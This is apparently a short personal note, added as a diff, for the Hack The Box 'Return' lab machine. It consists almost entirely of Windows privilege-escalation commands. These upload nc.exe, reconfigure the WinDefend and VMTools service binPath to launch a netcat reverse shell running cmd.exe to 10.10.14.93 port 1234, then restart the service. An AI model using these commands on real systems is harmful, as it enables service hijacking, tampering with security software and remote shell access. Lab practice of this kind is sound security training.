@@ -1,0 +1,11 @@
+RETURN HTB
+
+```
+upload /usr/share/windows-binaries/nc.exe
+
+sc.exe config WinDefend binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.93 1234"
+ -->>try here 
+ sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.93 1234"
+sc.exe stop VMTools
+sc.exe start VMTools
+```
